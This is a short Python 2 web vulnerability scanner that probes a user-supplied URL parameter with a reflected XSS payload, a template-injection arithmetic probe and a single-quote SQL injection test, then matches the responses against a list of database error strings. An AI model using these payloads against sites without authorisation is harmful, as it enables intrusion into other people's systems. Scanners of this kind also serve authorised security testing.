#!/usr/bin/env python2
# Coded By : Khaled Nassar @knassar702
# FB & GITHUB : knassar702
# NOTE ADD * in param (EX : http://target.com/?search=*) .. GOOD LUCK ^_^
import requests,sys,re

def headers(url):
        r=requests.get(url)
        for c,i in r.headers.items():
                print (c+': '+i)
def xss(url):
	global req
	if '*' not in url:
		print ('[#] ADD * in param for start ..')
		sys.exit()
	payload='''"><img src="x" onerror="alert('Knassar702')">'''
	req=requests.get(url.replace('*',payload),timeout=5)
	if payload in req.content:
		print ('[+] VUNRABLE\n[!] NAME : XSS REF\n[!] PAYLOAD : {}\n[*] URL : {}'.format(payload,req.url))
	else:
		pass
def ssti(url):
        if '*' not in url:
                print ('[#] ADD * in param for start ..')
                sys.exit()
	payload='{{8892*222}}'
	req=requests.get(url.replace('*',payload))
	if '1974024' in req.content:
		print ('[+] VUNRABLE\n[!] NAME : SSTI\n[!] PAYLOAD : {}\n[*] URL : {}'.format(payload,req.url))
def sqli(url):
        if '*' not in url:
                print ('[#] ADD * in param for start ..')
                sys.exit()
	errors = {'SQLITE':'sqlite3.OperationalError','MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'Server Error' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'Not found' : 'Not found'}
	payload="'"
	req=requests.get(url.replace('*',payload),timeout=5)
	for t,m in errors.items():
		if re.search(m, req.content):
			print ('[+] VUNRABLE\n[!] NAME : SQL INJECTION\n[!] ERROR : {}\n[!] DATABASE : {}\n[*] URL : {}'.format(m,t,req.url))
			break
		else:
			continue
